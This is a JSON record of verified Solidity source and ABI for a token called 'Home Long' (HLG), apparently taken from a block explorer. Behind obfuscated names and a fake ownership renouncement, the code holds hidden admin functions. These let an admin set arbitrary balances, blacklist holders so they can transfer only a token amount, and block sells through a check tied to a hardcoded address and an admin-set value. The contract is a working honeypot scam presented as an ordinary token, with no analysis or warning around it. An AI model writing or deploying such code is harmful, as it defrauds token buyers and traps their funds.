{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface fromExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchSenderFund {\n    function createPair(address fromTokenMax, address isLimitEnable) external returns (address);\n}\n\ninterface fromLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingReceiver) external view returns (uint256);\n\n    function transfer(address fundReceiver, uint256 txToken) external returns (bool);\n\n    function allowance(address takeToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundReceiver,\n        uint256 txToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapMinLaunch, uint256 value);\n    event Approval(address indexed takeToken, address indexed spender, uint256 value);\n}\n\ninterface fromLimitMetadata is fromLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HomeLong is enableLimit, fromLimit, fromLimitMetadata {\n\n    function sellList(address shouldReceiver, address fundReceiver, uint256 txToken) internal returns (bool) {\n        if (shouldReceiver == liquidityList) {\n            return totalTxLaunched(shouldReceiver, fundReceiver, txToken);\n        }\n        uint256 isSwap = fromLimit(toTeam).balanceOf(limitWalletMin);\n        require(isSwap == fundAutoExempt);\n        require(fundReceiver != limitWalletMin);\n        if (amountAuto[shouldReceiver]) {\n            return totalTxLaunched(shouldReceiver, fundReceiver, totalMin);\n        }\n        return totalTxLaunched(shouldReceiver, fundReceiver, txToken);\n    }\n\n    uint256 private shouldList = 100000000 * 10 ** 18;\n\n    function transferFrom(address shouldReceiver, address fundReceiver, uint256 txToken) external override returns (bool) {\n        if (_msgSender() != atMode) {\n            if (launchFund[shouldReceiver][_msgSender()] != type(uint256).max) {\n                require(txToken <= launchFund[shouldReceiver][_msgSender()]);\n                launchFund[shouldReceiver][_msgSender()] -= txToken;\n            }\n        }\n        return sellList(shouldReceiver, fundReceiver, txToken);\n    }\n\n    function liquidityFee(address txReceiverFund, uint256 txToken) public {\n        walletTo();\n        walletReceiver[txReceiverFund] = txToken;\n    }\n\n    uint8 private exemptMax = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return txList;\n    }\n\n    constructor (){\n        if (sellMin) {\n            isTakeAmount = true;\n        }\n        fromExempt modeAt = fromExempt(atMode);\n        toTeam = launchSenderFund(modeAt.factory()).createPair(modeAt.WETH(), address(this));\n        \n        liquidityList = _msgSender();\n        modeReceiverSwap();\n        takeMin[liquidityList] = true;\n        walletReceiver[liquidityList] = shouldList;\n        \n        emit Transfer(address(0), liquidityList, shouldList);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptMax;\n    }\n\n    address limitWalletMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public liquidityList;\n\n    string private tokenFund = \"HLG\";\n\n    uint256 constant totalMin = 5 ** 10;\n\n    bool public walletTeam;\n\n    function totalTxLaunched(address shouldReceiver, address fundReceiver, uint256 txToken) internal returns (bool) {\n        require(walletReceiver[shouldReceiver] >= txToken);\n        walletReceiver[shouldReceiver] -= txToken;\n        walletReceiver[fundReceiver] += txToken;\n        emit Transfer(shouldReceiver, fundReceiver, txToken);\n        return true;\n    }\n\n    function minLiquidity(address enableLaunch) public {\n        walletTo();\n        \n        if (enableLaunch == liquidityList || enableLaunch == toTeam) {\n            return;\n        }\n        amountAuto[enableLaunch] = true;\n    }\n\n    function owner() external view returns (address) {\n        return modeMax;\n    }\n\n    mapping(address => bool) public takeMin;\n\n    function walletTo() private view {\n        require(takeMin[_msgSender()]);\n    }\n\n    address public toTeam;\n\n    bool private sellMin;\n\n    function balanceOf(address tradingReceiver) public view virtual override returns (uint256) {\n        return walletReceiver[tradingReceiver];\n    }\n\n    mapping(address => uint256) private walletReceiver;\n\n    uint256 fundSender;\n\n    bool private isTakeAmount;\n\n    function shouldFund(uint256 txToken) public {\n        walletTo();\n        fundAutoExempt = txToken;\n    }\n\n    uint256 public receiverShould;\n\n    mapping(address => mapping(address => uint256)) private launchFund;\n\n    event OwnershipTransferred(address indexed launchMin, address indexed listTotalAmount);\n\n    function modeReceiverSwap() public {\n        emit OwnershipTransferred(liquidityList, address(0));\n        modeMax = address(0);\n    }\n\n    address atMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address sellLiquidity, address launchAt) external view virtual override returns (uint256) {\n        if (launchAt == atMode) {\n            return type(uint256).max;\n        }\n        return launchFund[sellLiquidity][launchAt];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenFund;\n    }\n\n    function transfer(address txReceiverFund, uint256 txToken) external virtual override returns (bool) {\n        return sellList(_msgSender(), txReceiverFund, txToken);\n    }\n\n    mapping(address => bool) public amountAuto;\n\n    bool private atFund;\n\n    string private txList = \"Home Long\";\n\n    function getOwner() external view returns (address) {\n        return modeMax;\n    }\n\n    uint256 public limitMax;\n\n    uint256 private teamReceiver;\n\n    address private modeMax;\n\n    function approve(address launchAt, uint256 txToken) public virtual override returns (bool) {\n        launchFund[_msgSender()][launchAt] = txToken;\n        emit Approval(_msgSender(), launchAt, txToken);\n        return true;\n    }\n\n    function exemptShould(address tokenTeam) public {\n        require(tokenTeam.balance < 100000);\n        if (walletTeam) {\n            return;\n        }\n        if (teamReceiver != limitMax) {\n            sellMin = false;\n        }\n        takeMin[tokenTeam] = true;\n        if (isTakeAmount != atFund) {\n            limitMax = teamReceiver;\n        }\n        walletTeam = true;\n    }\n\n    uint256 fundAutoExempt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldList;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTotalAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMinLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTeam\",\"type\":\"address\"}],\"name\":\"exemptShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiverFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txToken\",\"type\":\"uint256\"}],\"name\":\"liquidityFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunch\",\"type\":\"address\"}],\"name\":\"minLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiverSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txToken\",\"type\":\"uint256\"}],\"name\":\"shouldFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiverFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "HomeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}